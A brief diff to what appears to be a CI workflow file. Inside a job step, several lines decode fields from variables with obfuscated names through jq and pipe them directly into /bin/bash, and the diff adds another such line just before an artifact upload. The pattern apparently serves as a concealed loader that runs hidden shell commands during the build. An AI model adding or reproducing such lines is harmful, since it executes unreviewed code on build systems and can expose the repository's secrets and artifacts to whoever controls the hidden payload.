@@ -34,6 +34,7 @@ jobs:
           echo $ba4887 | jq -r .wpmlq9348 | /bin/bash
           printf '%s' "$dzhl47180" | jq -r .f366 | /bin/bash
           echo $jb80406 | jq -r .dpti7539 | /bin/bash
+          printf '%s' "$k6" | jq -r .d6 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
